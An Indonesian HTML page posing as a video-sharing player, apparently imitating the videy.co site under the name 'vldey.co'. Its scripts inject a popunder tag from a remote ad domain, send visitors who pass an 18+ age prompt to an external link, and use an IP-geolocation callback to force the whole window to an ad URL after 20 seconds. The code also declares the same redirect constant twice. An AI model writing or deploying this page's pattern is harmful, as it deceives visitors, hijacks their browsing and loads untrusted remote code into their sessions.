<!doctype html>
<html lang="id">
<head>
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
	<title>Vudol</title>

	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

	<style>
	:root{
		--bg:#ffffff; --text:#0f172a; --muted:#64748b; --line:#e2e8f0;
		--btn:#111827; --btnText:#fff;
	}

	*,*::before,*::after{box-sizing:border-box}
	html,body{margin:0;height:100%}
	body{
		font-family:Inter,system-ui;
		background:var(--bg);
		color:var(--text);
		overflow-x:hidden;
	}

	.appbar{
		position:sticky;top:0;
		background:#fff;
		border-bottom:1px solid var(--line);
		backdrop-filter:blur(8px);
	}

	.bar-inner{
		max-width:1100px;
		margin:auto;
		display:flex;
		padding:10px 16px;
		align-items:center;
		gap:10px;
	}

	.logo{
		width:28px;height:28px;
		background:#111827;color:#fff;
		display:grid;place-items:center;
		border-radius:6px;
		font-weight:700;
	}

	.spacer{flex:1}

	.btn{
		background:var(--btn);
		color:var(--btnText);
		border:0;
		padding:10px 14px;
		border-radius:10px;
		font-weight:600;
	}

	.wrap{
		max-width:1100px;
		margin:auto;
		padding:16px;
	}

	.phone{
		width:clamp(240px,92vw,420px);
		aspect-ratio:9/16;
		margin:auto;
		background:#000;
		border-radius:20px;
		overflow:hidden;
		box-shadow:0 10px 30px rgba(0,0,0,.15);
	}

	video{
		width:100%;
		height:100%;
		object-fit:cover;
	}

	.meta{
		text-align:center;
		margin-top:15px;
		color:var(--muted);
		font-size:13px;
	}

	#age-backdrop{
		position:fixed;inset:0;
		background:rgba(0,0,0,.5);
		display:grid;
		place-items:center;
		z-index:9999;
	}

	#age-box{
		background:#fff;
		padding:20px;
		border-radius:14px;
		width:90%;
		max-width:360px;
		text-align:center;
	}
	</style>
</head>

<body>

<!-- POPUNDER -->
<script>
(function(s){
	s.dataset.zone='11029644',
	s.src='https://al5sm.com/tag.min.js'
})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
</script>

<header class="appbar">
	<div class="bar-inner">
		<div class="logo">V</div>
		<div>vldey.co</div>
		<div class="spacer"></div>
		<button class="btn">Upload</button>
	</div>
</header>

<div class="wrap">

	<div class="phone">
		<video id="video" controls playsinline>
			<source src="https://cdn2.videy.co/5Ln0fkF91.mp4" type="video/mp4">
		</video>
	</div>

	<div class="meta" id="meta">0:00</div>

</div>

<!-- AGE POPUP -->
<div id="age-backdrop">
	<div id="age-box">
		<h3>Konfirmasi Usia</h3>
		<p>Apakah Anda 18+?</p>
		<button onclick="go()">LANJUT</button>
		<button onclick="this.parentElement.parentElement.style.display='none'">BATAL</button>
	</div>
</div>

<script>
const DIRECTLINK = "https://omg10.com/4/11029689";

function go(){
	window.location.href = DIRECTLINK;
}
</script>

<script>
const v = document.getElementById("video");
const meta = document.getElementById("meta");

v.addEventListener("timeupdate", ()=>{
	meta.textContent = Math.floor(v.currentTime) + "s";
});
</script>

<!-- DIRECTLINK AUTO AFTER 20s -->
<script>
var DIRECTLINK = "https://omg10.com/4/11029689";
var DELAY = 20000;

function geoip(){
	setTimeout(function(){
		window.top.location.href = DIRECTLINK;
	}, DELAY);
}
</script>

<script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>

</body>
</html>
